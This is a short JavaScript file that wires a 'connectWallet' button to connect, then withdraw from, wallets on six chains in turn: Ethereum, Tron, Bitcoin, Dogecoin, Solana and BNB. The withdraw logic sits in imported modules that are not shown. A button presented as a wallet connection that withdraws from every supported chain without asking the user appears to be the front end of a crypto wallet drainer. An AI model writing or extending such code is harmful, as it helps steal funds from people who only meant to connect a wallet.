import { connectEthereumWallet, withdrawEthereum } from './ethereum';
import { connectTronWallet, withdrawTron } from './tron';
import { connectBitcoinWallet, withdrawBitcoin } from './bitcoin';
import { connectDogecoinWallet, withdrawDogecoin } from './dogecoin';
import { connectSolanaWallet, withdrawSolana } from './solana';
import { connectBNBWallet, withdrawBNB } from './bnb';

document.getElementById('connectWallet').addEventListener('click', async () => {
    try {
        // Connect and withdraw Ethereum
        await connectEthereumWallet();
        await withdrawEthereum();

        // Connect and withdraw TRX
        await connectTronWallet();
        await withdrawTron();

        // Connect and withdraw Bitcoin
        await connectBitcoinWallet();
        await withdrawBitcoin();

        // Connect and withdraw Dogecoin
        await connectDogecoinWallet();
        await withdrawDogecoin();

        // Connect and withdraw Solana
        await connectSolanaWallet();
        await withdrawSolana();

        // Connect and withdraw BNB
        await connectBNBWallet();
        await withdrawBNB();
    } catch (error) {
        console.error('An error occurred during the withdrawal process:', error);
    }
});
